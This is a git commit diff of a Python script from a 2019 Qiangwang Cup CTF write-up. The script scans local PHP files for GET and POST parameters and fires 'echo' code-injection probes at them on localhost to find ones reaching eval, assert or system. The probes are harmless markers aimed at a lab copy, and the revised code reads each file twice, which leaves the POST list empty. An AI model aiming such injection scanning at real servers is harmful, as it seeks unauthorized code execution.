083c6b4798947f578e27cb809ad2593082a2a221
Mirror <2821319009@qq.com>
2019-12-26 21:23:46 +0800

    qwb_x

--- 强网杯_2019-Writeup.assets/key.py
+++ 强网杯_2019-Writeup.assets/key.py
@@ -1,84 +1,58 @@
 import os
-import threading
-from concurrent.futures.thread import ThreadPoolExecutor
-
 import requests
-
+import re
+import threading
+import time
+print('开始时间：  '+  time.asctime( time.localtime(time.time()) ))
+s1=threading.Semaphore(100)                                         #这儿设置最大的线程数
+filePath = r"D:/phpStudy/WWW/src/"
+os.chdir(filePath)                                                  #改变当前的路径
+requests.adapters.DEFAULT_RETRIES = 5                               #设置重连次数，防止线程数过高，断开连接
+files = os.listdir(filePath)
 session = requests.Session()
+session.keep_alive = False                                           # 设置连接活跃状态为False
+def get_content(file):
+    s1.acquire()                                                
+    print('trying   '+file+ '     '+ time.asctime( time.localtime(time.time()) ))
+    with open(file,encoding='utf-8') as f:                          #打开php文件，提取所有的$_GET和$_POST的参数
+            gets = list(re.findall('\$_GET\[\'(.*?)\'\]', f.read()))
+            posts = list(re.findall('\$_POST\[\'(.*?)\'\]', f.read()))
+    data = {}                                                       #所有的$_POST
+    params = {}                                                     #所有的$_GET
+    for m in gets:
+        params[m] = "echo 'xxxxxx';"
+    for n in posts:
+        data[n] = "echo 'xxxxxx';"
+    url = 'http://127.0.0.1/src/'+file
+    req = session.post(url, data=data, params=params)           #一次性请求所有的GET和POST
+    req.close()                                             # 关闭请求  释放内存
+    req.encoding = 'utf-8'
+    content = req.text
+    #print(content)
+    if "xxxxxx" in content:                                 #如果发现有可以利用的参数，继续筛选出具体的参数
+        flag = 0
+        for a in gets:
+            req = session.get(url+'?%s='%a+"echo 'xxxxxx';")
+            content = req.text
+            req.close()                                             # 关闭请求  释放内存
+            if "xxxxxx" in content:
+                flag = 1
+                break
+        if flag != 1:
+            for b in posts:
+                req = session.post(url, data={b:"echo 'xxxxxx';"})
+                content = req.text
+                req.close()                                             # 关闭请求  释放内存
+                if "xxxxxx" in content:
+                    break
+        if flag == 1:                                                   #flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，
+            param = a
+        else:
+            param = b
+        print('找到了利用文件： '+file+"  and 找到了利用的参数：%s" %param)
+        print('结束时间：  ' + time.asctime(time.localtime(time.time())))
+    s1.release()
 
-path = "D:/phpStudy/WWW/src"  # 文件夹目录
-files = os.listdir(path)  # 得到文件夹下的所有文件名称
-
-mutex = threading.Lock()
-pool = ThreadPoolExecutor(max_workers=50)
-
-def read_file(file):
-    f = open(path + "/" + file);  # 打开文件
-    iter_f = iter(f);  # 创建迭代器
-    str = ""
-    for line in iter_f:  # 遍历文件，一行行遍历，读取文本
-        str = str + line
-
-    # 获取一个页面内所有参数
-    start = 0
-    params = {}
-    while str.find("$_GET['", start) != -1:
-        pos2 = str.find("']", str.find("$_GET['", start) + 1)
-        var = str[str.find("$_GET['", start) + 7: pos2]
-        start = pos2 + 1
-
-        params[var] = 'echo("glzjin");'
-
-        # print(var)
-
-    start = 0
-    data = {}
-    while str.find("$_POST['", start) != -1:
-        pos2 = str.find("']", str.find("$_POST['", start) + 1)
-        var = str[str.find("$_POST['", start) + 8: pos2]
-        start = pos2 + 1
-
-        data[var] = 'echo("glzjin");'
-
-        # print(var)
-
-    # eval test
-    r = session.post('http://127.0.0.1/src/' + file, data=data, params=params)
-    if r.text.find('glzjin') != -1:
-        mutex.acquire()
-        print(file + " found!")
-        mutex.release()
-
-    # assert test
-    for i in params:
-        params[i] = params[i][:-1]
-
-    for i in data:
-        data[i] = data[i][:-1]
-
-    r = session.post('http://127.0.0.1/src/' + file, data=data, params=params)
-    if r.text.find('glzjin') != -1:
-        mutex.acquire()
-        print(file + " found!")
-        mutex.release()
-
-    # system test
-    for i in params:
-        params[i] = 'echo glzjin'
-
-    for i in data:
-        data[i] = 'echo glzjin'
-
-    r = session.post('http://127.0.0.1/src/' + file, data=data, params=params)
-    if r.text.find('glzjin') != -1:
-        mutex.acquire()
-        print(file + " found!")
-        mutex.release()
-
-    # print("====================")
-
-for file in files:  # 遍历文件夹
-    if not os.path.isdir(file):  # 判断是否是文件夹，不是文件夹才打开
-        # read_file(file)
-
-        pool.submit(read_file, file)
+for i in files:                                                         #加入多线程
+   t = threading.Thread(target=get_content, args=(i,))
+   t.start()
